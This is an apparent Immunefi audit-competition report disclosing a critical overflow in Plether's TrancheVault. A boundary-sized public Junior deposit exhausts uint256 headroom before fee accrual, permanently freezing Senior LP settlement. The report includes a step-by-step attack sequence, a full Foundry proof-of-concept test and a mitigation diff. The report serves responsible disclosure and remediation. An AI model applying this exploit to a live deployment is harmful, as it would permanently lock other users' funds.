# \#100032 [SC-Critical] Missing Junior fee-share supply headroom lets a public deposit permanently freeze LP settlement

**Submitted on Nov 16th 2026 at 05:24:23 UTC by @Psyone for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100032
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Permanent freezing of funds

## Description

## Brief/Intro
After the documented owner governance path enables any positive Junior maintenance fee, a public depositor can drive raw Junior share supply close enough to uint256.max that the next completed fee hour makes effective supply unrepresentable. HousePool reads that effective Junior supply before funding Senior redemptions, so settlement panics and rolls back even when the pool has enough USDG. The reproduced state permanently freezes a fully owed 51,473,885.158886 USDG Senior redemption.

## Vulnerability Details

### Root cause

TrancheVault treats Junior effective supply as:

    raw ERC-20 totalSupply + pending maintenance-fee shares

pendingMaintenanceFeeShares() computes fee dilution from raw supply, and accruedTotalSupply() performs a checked addition. No invariant reserves numerical headroom for the next fee accrual when a public deposit mints raw Junior shares.

A Junior deposit is priced with the current effective supply and tranche pricing assets. After ordinary Senior coupon transfers reduce Junior pricing principal close to one USDG atom, a comparatively small public deposit can receive an enormous number of shares. The mint itself remains below uint256.max, but it can leave less headroom than the fee shares that accrue during the next completed hour.

The next accruedTotalSupply() call then panics on the checked addition. HousePool settlement reads Junior accrued supply before it funds Senior demand, so this prevents both the effective-supply view and LP settlement.

The fee checkpoint path has the same issue. Any nonzero Junior mint or burn first checkpoints the fee, and finalizing a proposal to disable the fee first checkpoints the old rate. Once the poisoned state exists, ordinary burns, new mints, settlement, and fee disablement all revert.

### Reachable configuration is normal honest setup

The release begins at 0 bps. The PoC preserves that configuration and uses the production 72-hour propose/finalize flow before any attacker action.

This is not an allegation that choosing a permitted fee is itself a bug. Positive fees are a documented supported state:

- The competition states that a legitimate documented trusted-role action that triggers a bug is in scope and identifies fee changes as an owner power.
- Plether PR #117 changed the initial value from 100 bps to 0 bps and says Junior LPs accrue no maintenance-fee dilution until governance enables a positive rate.
- Plether PR #127 was merged after the zero-default decision. It expanded the permitted range to 10,000 bps, required operators and integrations to support the configurable range, and retained zero only as the deployment default.
- The whitepaper, SECURITY.md, and ACCOUNTING_SPEC.md describe an optional governance-configured fee and its positive-rate behavior.
- Earlier Arbitrum Sepolia releases actually used 100 bps.

The vulnerability is the missing headroom invariant reached after that legitimate transition, followed by an untrusted user's public deposit.

### Attack sequence

1. The protocol starts with the release configuration, including a 0-bps Junior fee.
2. The owner uses the documented 72-hour governance flow to enable a positive fee. The main reproduction uses the historical 100-bps value; separate complete tests cover 1, 10, 1,000, and 10,000 bps.
3. Honest LP liquidity and Senior coupon operation create the supported accounting state modeled by the test.
4. The attacker uses only public asynchronous Junior deposits and permissionless epoch settlement. Coupon intervals reduce Junior pricing principal close to one atom while fee dilution raises effective share supply.
5. The attacker submits the derived final boundary deposit. It mints valid raw shares but leaves less uint256 headroom than the next one-hour fee.
6. A Senior LP requests redemption.
7. After one completed fee hour, accruedTotalSupply() and settleLpEpoch(0,0) panic with checked arithmetic before any Senior shares are funded.
8. The revert rolls all settlement mutations back. Waiting, adding cash, disabling the fee, or attempting another mint/burn does not repair the state.

### Rate independence

This is not specific to 100 bps.

| APR | Result | Boundary deposit | Attacker total |
| ---: | --- | ---: | ---: |
| 0 bps | negative control: no pending fee shares | — | — |
| 1 bps | permanent freeze | 109,046.247458 USDG | 577,822.285199 USDG |
| 10 bps | permanent freeze | 108,872.599001 USDG | 577,648.636742 USDG |
| 100 bps | permanent freeze | 107,151.249794 USDG | 575,927.287535 USDG |
| 1,000 bps | permanent freeze | 91,365.735420 USDG | 560,141.773161 USDG |
| 10,000 bps | permanent freeze | 18,561.171098 USDG | 487,337.208839 USDG |

The permitted integer range is 0 through 10,000 bps. At 1 bps the hourly fee factor is already positive. Higher positive rates change the exact boundary but not the mechanism.

## Impact Details

The PoC branches from the same snapshot and changes only the final deposit by one USDG atom:

- Control: 107,151.249793 USDG final deposit.
- Attack: 107,151.249794 USDG final deposit.
- Control result: all victim Senior shares are funded for 51,473,885.158886 USDG.
- Attack result: zero victim shares are funded, although the attack branch holds 51,580,567.652554 USDG in the pool.
- The failed call restores pool cash and both tranche-principal values, proving that the settlement never progresses.
- The failure remains after another 365 days.
- Fee disablement after its 72-hour delay reverts while checkpointing the old fee.
- The contracts are non-upgradeable and the vault bindings are one-time, so ordinary operation cannot repair the affected deployment.

This matches the program's Critical impact “Permanent freezing of funds.”

The attacker does not demonstrate profit, so the financial-ratio rule is relevant. At the historically used 100-bps rate, frozen funds divided by attacker capital is 89.38:1, within the program's case-by-case interval. At the permitted 10,000-bps rate, the same demonstrated victim entitlement divided by attacker capital is 105.62:1, above the program's stated non-griefing baseline.

The coupon-only construction takes approximately 3.8 years. This is a conservative demonstrated route; no faster trading-loss route is claimed. Under the competition rules, feasibility is evaluated separately from impact and may affect payout.

## Mitigation

Ensure every pending-fee quote is bounded by remaining ERC-20 supply headroom, including the 1,000 virtual-share offset, before it is used by accruedTotalSupply() or minted by a checkpoint. Enforce the same ceiling on every raw-share mint. The comparison must use 512-bit products so the cap check cannot itself overflow at high APR or raw supply.

```diff
diff --git a/packages/perps/src/libraries/JuniorMaintenanceFeeMathLib.sol b/packages/perps/src/libraries/JuniorMaintenanceFeeMathLib.sol
@@
+    /// @notice Quotes fee shares without exceeding a caller-supplied representational headroom.
+    function pendingFeeSharesCapped(
+        uint256 rawSupply,
+        uint256 aprBps,
+        uint256 chargeableHours,
+        uint256 maxFeeShares
+    ) internal pure returns (uint256 feeShares) {
+        uint256 retainedRay = retentionRay(aprBps, chargeableHours);
+        if (rawSupply == 0 || retainedRay == RAY || maxFeeShares == 0) {
+            return 0;
+        }
+        if (maxFeeShares == type(uint256).max) {
+            return pendingFeeShares(rawSupply, aprBps, chargeableHours);
+        }
+
+        uint256 dilutedRay = RAY - retainedRay;
+        (uint256 quoteHigh, uint256 quoteLow) = Math.mul512(rawSupply, dilutedRay);
+        (uint256 capHigh, uint256 capLow) = Math.mul512(maxFeeShares + 1, retainedRay);
+        if (quoteHigh > capHigh || (quoteHigh == capHigh && quoteLow >= capLow)) {
+            return maxFeeShares;
+        }
+        return Math.mulDiv(rawSupply, dilutedRay, retainedRay, Math.Rounding.Floor);
+    }
diff --git a/packages/perps/src/TrancheVault.sol b/packages/perps/src/TrancheVault.sol
@@
+    error TrancheVault__ShareSupplyLimit();
@@
     uint256 internal constant VIRTUAL_SHARES = 1000;
+    uint256 internal constant MAX_RAW_SHARE_SUPPLY = type(uint256).max - VIRTUAL_SHARES;
@@
     function _update(
         address from,
         address to,
         uint256 amount
     ) internal override {
         if (!IS_SENIOR && amount != 0 && (from == address(0) || to == address(0)) && maintenanceFeeAprBps != 0) {
             _checkpointMaintenanceFee();
         }
+        if (from == address(0) && amount != 0) {
+            uint256 rawSupply = totalSupply();
+            if (rawSupply > MAX_RAW_SHARE_SUPPLY || amount > MAX_RAW_SHARE_SUPPLY - rawSupply) {
+                revert TrancheVault__ShareSupplyLimit();
+            }
+        }
@@
     function pendingMaintenanceFeeShares() public view returns (uint256) {
         uint256 rawSupply = totalSupply();
@@
-        return JuniorMaintenanceFeeMathLib.pendingFeeShares(rawSupply, maintenanceFeeAprBps, chargeableHours);
+        return _pendingMaintenanceFeeSharesCapped(rawSupply, chargeableHours);
@@
-        uint256 feeShares =
-            JuniorMaintenanceFeeMathLib.pendingFeeShares(rawSupply, maintenanceFeeAprBps, chargeableHours);
+        uint256 feeShares = _pendingMaintenanceFeeSharesCapped(rawSupply, chargeableHours);
@@
+    function _pendingMaintenanceFeeSharesCapped(
+        uint256 rawSupply,
+        uint256 chargeableHours
+    ) private view returns (uint256) {
+        if (rawSupply >= MAX_RAW_SHARE_SUPPLY) {
+            return 0;
+        }
+        return JuniorMaintenanceFeeMathLib.pendingFeeSharesCapped(
+            rawSupply,
+            maintenanceFeeAprBps,
+            chargeableHours,
+            MAX_RAW_SHARE_SUPPLY - rawSupply
+        );
+    }
```

The mint ceiling and capped quote are both required: the former preserves room for virtual-share arithmetic, while the latter prevents accrued fee shares from consuming the remaining room. Do not fix only accruedTotalSupply() with unchecked arithmetic; checkpoint minting must use the same bounded quote.

Regression properties should assert:

1. raw supply plus pending fee shares plus virtual shares never exceeds uint256.max;
2. accruedTotalSupply() and every conversion adding virtual shares are callable for every reachable supply and permitted fee;
3. a fee checkpoint cannot make later settlement permanently uncallable;
4. the supplied one-atom attack branch settles after the fix while the lower control remains unchanged.

## References

- Plether competition scope: https://immunefi.com/audit-competition/plether/scope/
- TrancheVault.sol at the frozen commit: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- HousePool.sol at the frozen commit: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- JuniorMaintenanceFeeMathLib.sol: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/JuniorMaintenanceFeeMathLib.sol
- SECURITY.md: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md
- ACCOUNTING_SPEC.md: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md
- Zero-default change, PR #117: https://github.com/Plether-Fi/plether-core/pull/117
- Expanded fee range, PR #127: https://github.com/Plether-Fi/plether-core/pull/127



## Proof of Concept

## Proof of Concept

Create packages/perps/test/perps/accounting/fees/JuniorFeeSupplyOverflowPoC.t.sol with the following contents:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {JuniorMaintenanceFeeMathLib} from "@plether/perps/libraries/JuniorMaintenanceFeeMathLib.sol";
import {stdError} from "forge-std/StdError.sol";

import {HousePoolAsyncTestBase} from "../../shared/HousePoolTestBase.sol";

/// @notice Demonstrates that fee-share supply headroom exhaustion permanently blocks LP settlement.
/// @dev Uses production HousePool/TrancheVault code and only the repository's mock token/oracle fixture.
contract JuniorFeeSupplyOverflowPoCTest is HousePoolAsyncTestBase {

    uint256 internal constant SENIOR_RATE_BPS = 800;
    uint256 internal constant INITIAL_JUNIOR_LIQUIDITY = 12_004_638_365_019;
    uint256 internal constant INITIAL_SENIOR_LIQUIDITY = 39_000_000e6;
    uint256 internal constant FIRST_COUPON_INTERVAL = 280 days;
    uint256 internal constant LONG_COUPON_INTERVAL = 1106 days;
    uint256 internal constant SECONDS_PER_YEAR = 365 days;
    uint256 internal constant VIRTUAL_SHARES = 1000;

    address internal constant SENIOR_LP = address(0x5E4102);
    address internal constant JUNIOR_LP = address(0xA1102);
    address internal constant ATTACKER = address(0xA77AC);
    address internal constant FEE_RECIPIENT = address(0xFEE139);

    uint256 internal feeAprBps;

    struct PreparedState {
        uint256 attackerBeforeFinal;
        uint256 topUp;
        uint256 boundaryDeposit;
        uint256 controlDeposit;
        uint256 rawSupplyBeforeFinal;
        uint256 pricingSupplyAtFinal;
        uint256 seniorShares;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function test_PublicEpochsReachFeeHeadroomBoundaryAndFreezeSeniorSettlement() public {
        _runFeeRateScenario(100);
    }

    function test_ZeroBpsCannotCreatePendingFeeSupplyOverflow() public view {
        assertEq(juniorVault.maintenanceFeeAprBps(), 0, "release fixture must start with the fee disabled");
        assertEq(juniorVault.pendingMaintenanceFeeShares(), 0, "zero bps must not accrue fee shares");
        assertEq(
            JuniorMaintenanceFeeMathLib.pendingFeeShares(type(uint256).max, 0, 1),
            0,
            "zero bps must remain zero even at maximum raw supply"
        );
    }

    function test_MinimumOneBpsAlsoFreezesSeniorSettlement() public {
        _runFeeRateScenario(1);
    }

    function test_TenBpsAlsoFreezesSeniorSettlement() public {
        _runFeeRateScenario(10);
    }

    function test_OneThousandBpsAlsoFreezesSeniorSettlement() public {
        _runFeeRateScenario(1000);
    }

    function test_MaximumTenThousandBpsAlsoFreezesSeniorSettlement() public {
        _runFeeRateScenario(10_000);
    }

    function _runFeeRateScenario(
        uint256 rateBps
    ) internal {
        feeAprBps = rateBps;
        PreparedState memory prepared = _prepareBoundaryState();
        uint256 branchPoint = vm.snapshotState();

        uint256 controlFundedAssets = _runControl(prepared);
        assertGt(controlFundedAssets, 0, "one-atom-lower control must fund the Senior redemption");

        assertTrue(vm.revertToState(branchPoint));
        uint256 poolAssetsBeforeFailedSettlement = _runAttack(prepared);

        emit log_named_uint("fee_apr_bps", feeAprBps);
        emit log_named_uint("derived_boundary_deposit_assets", prepared.boundaryDeposit);
        emit log_named_uint("one_atom_lower_control_assets", prepared.controlDeposit);
        emit log_named_uint("derived_top_up_assets", prepared.topUp);
        emit log_named_uint("attacker_assets_before_final", prepared.attackerBeforeFinal);
        emit log_named_uint("attacker_total_assets", prepared.attackerBeforeFinal + prepared.boundaryDeposit);
        emit log_named_uint("control_senior_funded_assets", controlFundedAssets);
        emit log_named_uint("attack_pool_assets", poolAssetsBeforeFailedSettlement);
    }

    function _prepareBoundaryState() internal returns (PreparedState memory prepared) {
        assertGt(feeAprBps, 0, "scenario must enable a nonzero fee");
        _setSeniorCapacity(40_000_000e6, 8000);
        _fundTrancheAsync(juniorVault, JUNIOR_LP, INITIAL_JUNIOR_LIQUIDITY);
        prepared.seniorShares = _fundTrancheAsync(seniorVault, SENIOR_LP, INITIAL_SENIOR_LIQUIDITY);

        juniorVault.proposeMaintenanceFeeConfig(feeAprBps, FEE_RECIPIENT);
        vm.warp(juniorVault.maintenanceFeeConfigActivationTime());
        juniorVault.finalizeMaintenanceFeeConfig();
        while (engine.isOracleFrozen()) {
            vm.warp(vm.getBlockTimestamp() + 1 days);
        }

        uint256 firstAttackerRequest = _requestAsyncDeposit(juniorVault, ATTACKER, 1e6);
        vm.warp(block.timestamp + FIRST_COUPON_INTERVAL);
        _settleLpEpochForTest();
        assertEq(juniorVault.claimableDepositRequest(firstAttackerRequest, ATTACKER), 1e6);
        prepared.attackerBeforeFinal = 1e6;

        prepared.topUp = _topUpForOneAtomAfterLongInterval();
        _fundTrancheAsync(juniorVault, ATTACKER, prepared.topUp);
        prepared.attackerBeforeFinal += prepared.topUp;

        uint256 longCoupon = _seniorCoupon(pool.seniorPrincipal(), LONG_COUPON_INTERVAL);
        assertEq(pool.juniorPrincipal(), longCoupon + 1, "top-up must leave one atom after the long coupon");
        uint256 firstHourlyReplacement = _seniorCoupon(pool.seniorPrincipal() + longCoupon, 1 hours);

        uint256 firstRequest = _requestAsyncDeposit(juniorVault, ATTACKER, firstHourlyReplacement);
        vm.warp(block.timestamp + LONG_COUPON_INTERVAL);
        _settleLpEpochForTest();
        assertEq(
            pool.juniorPrincipal(),
            firstHourlyReplacement + 1,
            "long settlement must price the first replacement deposit from one atom"
        );
        prepared.attackerBeforeFinal += firstHourlyReplacement;
        emit log_named_uint("hourly_replacement_1", firstHourlyReplacement);
        assertEq(juniorVault.claimableDepositRequest(firstRequest, ATTACKER), firstHourlyReplacement);

        uint256 previousReplacement = firstHourlyReplacement;
        for (uint256 i = 1; i < 6; ++i) {
            uint256 currentCoupon = _seniorCoupon(pool.seniorPrincipal(), 1 hours);
            assertEq(currentCoupon, previousReplacement, "the prior replacement must cover this hour's coupon");
            uint256 nextReplacement = _seniorCoupon(pool.seniorPrincipal() + currentCoupon, 1 hours);
            uint256 requestId = _requestAsyncDeposit(juniorVault, ATTACKER, nextReplacement);
            vm.warp(juniorVault.depositEpochStart(requestId));
            _settleLpEpochForTest();
            assertEq(pool.juniorPrincipal(), nextReplacement + 1, "each public epoch must preserve one atom");
            prepared.attackerBeforeFinal += nextReplacement;
            previousReplacement = nextReplacement;
            emit log_named_uint(string.concat("hourly_replacement_", vm.toString(i + 1)), nextReplacement);
        }

        prepared.rawSupplyBeforeFinal = juniorVault.totalSupply();
        uint256 finalCoupon = _seniorCoupon(pool.seniorPrincipal(), 1 hours);
        assertEq(
            finalCoupon, previousReplacement, "the final request epoch must again reduce Junior principal to one atom"
        );
        uint256 pendingAtFinal =
            JuniorMaintenanceFeeMathLib.pendingFeeShares(prepared.rawSupplyBeforeFinal, feeAprBps, 1);
        prepared.pricingSupplyAtFinal = prepared.rawSupplyBeforeFinal + pendingAtFinal;
        prepared.boundaryDeposit = _firstDepositWhoseNextHourFeeOverflows(prepared.pricingSupplyAtFinal);
        prepared.controlDeposit = prepared.boundaryDeposit - 1;

        assertFalse(_nextHourOverflows(prepared.pricingSupplyAtFinal, prepared.controlDeposit));
        assertTrue(_nextHourOverflows(prepared.pricingSupplyAtFinal, prepared.boundaryDeposit));
    }

    function _topUpForOneAtomAfterLongInterval() internal view returns (uint256 topUp) {
        (uint256 requestEpoch,) = juniorVault.getRequestEpochWindow();
        uint256 settlementTime = juniorVault.depositEpochStart(requestEpoch);
        uint256 elapsedToTopUp = settlementTime - pool.lastSeniorCouponCheckpointTime();
        uint256 couponBeforeTopUp = _seniorCoupon(pool.seniorPrincipal(), elapsedToTopUp);
        uint256 juniorAfterCoupon = pool.juniorPrincipal() - couponBeforeTopUp;
        uint256 seniorAfterCoupon = pool.seniorPrincipal() + couponBeforeTopUp;
        uint256 longCoupon = _seniorCoupon(seniorAfterCoupon, LONG_COUPON_INTERVAL);
        topUp = longCoupon + 1 - juniorAfterCoupon;
    }

    function _firstDepositWhoseNextHourFeeOverflows(
        uint256 pricingSupply
    ) internal view returns (uint256) {
        uint256 low = 1;
        uint256 high = 1_000_000e6;
        require(_nextHourOverflows(pricingSupply, high), "search ceiling must cross the fee-headroom boundary");

        while (low < high) {
            uint256 middle = low + (high - low) / 2;
            if (_nextHourOverflows(pricingSupply, middle)) {
                high = middle;
            } else {
                low = middle + 1;
            }
        }
        return low;
    }

    function _nextHourOverflows(
        uint256 pricingSupply,
        uint256 depositAssets
    ) internal view returns (bool) {
        uint256 shareNumerator = pricingSupply + VIRTUAL_SHARES;
        uint256 largestMintableDeposit = Math.mulDiv(type(uint256).max, 2, shareNumerator, Math.Rounding.Floor);
        if (depositAssets > largestMintableDeposit) {
            return true;
        }
        uint256 depositShares = Math.mulDiv(depositAssets, shareNumerator, 2, Math.Rounding.Floor);
        if (depositShares > type(uint256).max - pricingSupply) {
            return true;
        }
        uint256 rawAfterDeposit = pricingSupply + depositShares;
        uint256 nextFee = JuniorMaintenanceFeeMathLib.pendingFeeShares(rawAfterDeposit, feeAprBps, 1);
        return nextFee > type(uint256).max - rawAfterDeposit;
    }

    function _runControl(
        PreparedState memory prepared
    ) internal returns (uint256 fundedAssets) {
        uint256 requestId = _requestAsyncDeposit(juniorVault, ATTACKER, prepared.controlDeposit);
        vm.warp(juniorVault.depositEpochStart(requestId));
        _settleLpEpochForTest();
        assertEq(juniorVault.totalSupply() <= type(uint256).max, true);

        vm.prank(SENIOR_LP);
        uint256 redeemId = seniorVault.requestRedeem(prepared.seniorShares, SENIOR_LP, SENIOR_LP);
        vm.warp(seniorVault.depositEpochStart(redeemId));
        IHousePool.LpEpochSettlementResult memory result = pool.settleLpEpoch(0, 0);
        fundedAssets = result.seniorFundedAssets;
        assertEq(result.seniorFundedShares, prepared.seniorShares, "control must fully fund the victim's shares");
        assertEq(seniorVault.claimableRedeemRequest(redeemId, SENIOR_LP), prepared.seniorShares);
        juniorVault.accruedTotalSupply();
    }

    function _runAttack(
        PreparedState memory prepared
    ) internal returns (uint256 poolAssetsBeforeFailedSettlement) {
        uint256 requestId = _requestAsyncDeposit(juniorVault, ATTACKER, prepared.boundaryDeposit);
        vm.warp(juniorVault.depositEpochStart(requestId));
        _settleLpEpochForTest();

        uint256 rawSupply = juniorVault.totalSupply();
        assertLt(rawSupply, type(uint256).max, "the boundary deposit itself must remain a valid mint");
        uint256 remainingHeadroom = type(uint256).max - rawSupply;

        vm.prank(SENIOR_LP);
        uint256 redeemId = seniorVault.requestRedeem(prepared.seniorShares, SENIOR_LP, SENIOR_LP);
        vm.warp(seniorVault.depositEpochStart(redeemId));
        uint256 pendingFee = juniorVault.pendingMaintenanceFeeShares();
        assertGt(pendingFee, remainingHeadroom, "one completed fee hour must exceed the remaining supply headroom");
        poolAssetsBeforeFailedSettlement = settlementToken.balanceOf(address(pool));
        uint256 juniorPrincipalBefore = pool.juniorPrincipal();
        uint256 seniorPrincipalBefore = pool.seniorPrincipal();

        vm.expectRevert(stdError.arithmeticError);
        juniorVault.accruedTotalSupply();
        vm.expectRevert(stdError.arithmeticError);
        pool.settleLpEpoch(0, 0);
        assertEq(
            seniorVault.claimableRedeemRequest(redeemId, SENIOR_LP), 0, "failed settlement must not fund the victim"
        );
        assertEq(
            settlementToken.balanceOf(address(pool)),
            poolAssetsBeforeFailedSettlement,
            "failed settlement must roll back cash"
        );
        assertEq(pool.juniorPrincipal(), juniorPrincipalBefore, "failed settlement must roll back Junior principal");
        assertEq(pool.seniorPrincipal(), seniorPrincipalBefore, "failed settlement must roll back Senior principal");

        juniorVault.proposeMaintenanceFeeConfig(0, address(0));
        vm.warp(juniorVault.maintenanceFeeConfigActivationTime());
        vm.expectRevert(stdError.arithmeticError);
        juniorVault.finalizeMaintenanceFeeConfig();
        assertEq(juniorVault.maintenanceFeeAprBps(), feeAprBps, "failed finalization must leave the old fee active");

        vm.warp(block.timestamp + 365 days);
        vm.expectRevert(stdError.arithmeticError);
        juniorVault.accruedTotalSupply();
        vm.expectRevert(stdError.arithmeticError);
        pool.settleLpEpoch(0, 0);

        emit log_named_uint("attack_raw_supply", rawSupply);
        emit log_named_uint("attack_pending_fee", pendingFee);
        emit log_named_uint("attack_remaining_headroom", remainingHeadroom);
    }

    function _seniorCoupon(
        uint256 principal,
        uint256 elapsed
    ) internal pure returns (uint256) {
        return (principal * SENIOR_RATE_BPS * elapsed) / (10_000 * SECONDS_PER_YEAR);
    }

}
```

Run from packages/perps at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8:

```sh
forge test --match-path test/perps/accounting/fees/JuniorFeeSupplyOverflowPoC.t.sol -vv
```

Expected result: 6 tests pass. The five positive-rate tests each demonstrate the same permanent settlement freeze with a one-atom-lower successful control. The zero-rate test proves that the release default alone does not accrue fee shares.

